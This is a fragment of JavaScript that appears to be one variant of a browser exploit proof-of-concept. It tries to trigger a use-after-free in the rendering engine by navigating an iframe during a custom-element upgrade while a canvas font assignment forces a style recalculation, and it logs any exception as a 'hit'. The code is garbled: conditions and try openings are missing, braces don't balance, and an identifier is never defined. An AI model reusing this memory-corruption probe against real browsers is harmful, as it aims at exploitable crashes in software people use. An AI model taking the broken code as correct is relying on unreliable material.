// VARIANT D1 — navigate iframe document during updateStyleIfNeeded
// ═══════════════════════════════════════════════════════════════════
function variantD1() {
  return new Promise(resolve => {
    sep();
    log('[D1] iframe navigation during updateStyleIfNeeded()', 'info');
    log('[D1] target: stale Document& reference after iframe navigates away', 'info');

    const iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';

    iframe.srcdoc = `<!DOCTYPE html><html><body>
<canvas id="c" width="64" height="64"></canvas>
<script>window._ready = true;<\/script>
</body></html>`;

    iframe.onload = function() {
      const iwin = iframe.contentWindow;
      const idoc = iframe.contentDocument;

        log('[D1] iframe not ready', 'err');
        iframe.remove();
        return resolve(false);
      }

      log('[D1] iframe canvas context obtained', 'ok');

      // We define a custom element in the PARENT document

      let cbFired = false;

      customElements.define(TAG, class extends HTMLElement {
        connectedCallback() {

          // Navigate the iframe — this replaces the Document that C++ holds as Document&

          } catch(e) {}

      // We need the upgrade to fire in the context of the iframe's style update
      // Inject the trigger element INTO the iframe
      const trigger = idoc.createElement(TAG);
      idoc.body.appendChild(trigger);
      log('[D1] pending upgrade element inserted in iframe', 'ok');

      // Define it NOW so it's upgraded during next style recalc

      // ctx.font on the iframe context triggers iframe document style update

        log('[D1] EXCEPTION from ctx.font: ' + e.message, 'hit');

      resolve(cbFired);
